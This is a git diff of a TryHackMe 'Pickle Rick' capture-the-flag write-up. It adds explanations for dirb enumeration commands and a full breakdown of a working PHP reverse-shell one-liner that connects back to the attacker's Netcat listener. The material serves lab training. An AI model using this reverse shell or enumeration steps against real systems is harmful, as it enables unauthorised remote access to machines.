@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
 
 ##
 > Scanning for Hiddend Web Directory Using Dirb
-4. `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
+4. `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt` to scan the target's web server for different types of files using Dirb's0 built in **extensions_common.txt** file, which reveals that there are .php and .phtml file present within the target's web server
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ dirb http://10.10.29.218 /usr/share/dirb/wordlists/extensions_common.txt -r   
@@ -67,13 +67,13 @@ GENERATED WORDS: 28
 END_TIME: Mon Jun 26 23:35:09 2023
 DOWNLOADED: 28 - FOUND: 3
 ```
-5. `vim {FILENAME2}.txt`
+5. `vim {FILENAME2}.txt` to create a new text file containing the file extensions that were found to be present in the target's web server
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ vim Extensions.txt
 ```
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/extensions.txt.png)
-6. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt` to non-recursively scan the target URL using the custom extensions wordlist we created for files and directories using Dirb's default wordlist and then redirecting the results into a text file
+6. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt` to non-recursively scan the target URL using the custom extensions wordlist we created and then redirect the results into a text file
 7. `cat {FILENAME3}.txt` to output the scan results from the previous command
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -311,16 +311,21 @@ fleeb juice
 29. `cat {SECRET INGREDIENT FILE3}.txt`
 
 # Dissecting Comands
-`dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
-+ K
-
-
 `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt`
-+ K
++ **x {FILENAME2 WORDLIST PATH}** specifies a file that contains a list of file extensions to be used during the file and directory brute-forcing or enumeration process
++ **-r** specifies this to be a non recursive scan
++ **> {FILENAME3}.txt** redirects the output to the specified text file
 
 
 `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
-+ K
++ **php -r** starts the PHP interpreter in "read and execute" mode, allowing us to run PHP code directly from the command line
++ **$sock=fsockopen("{MACHINE IP}", {PORT NUMBER})** creates a TCP/IP socket connection to the specified machine IP address and port number of our active Netcat listener using the **fsocketopen()** PHP function, and then storing the resulting command in the **$sock** variable
++ **exec("/bin/sh -i <&3 >&3 2>&3")** uses the exec() PHP function to execute the **/bin/sh -i <&3 >&3 2>&3** command on the target machine
+     + **/bin/sh** is the path to the Bourne shell interpreter
+     + **-i** makes the shell session interactive, allowing user input and otput
+     + **<&3** redirects the stantard input (STDINT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
+     + **>&3** redirects the stantard output (STDOUT) of the shell to the socket connection in the **$sock** variable using the file descriptor 3
+     + **2>&3** redirects the standard error (STDERR) of the shell to the socket connection in the **$sock** variable using file descriptor 3
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
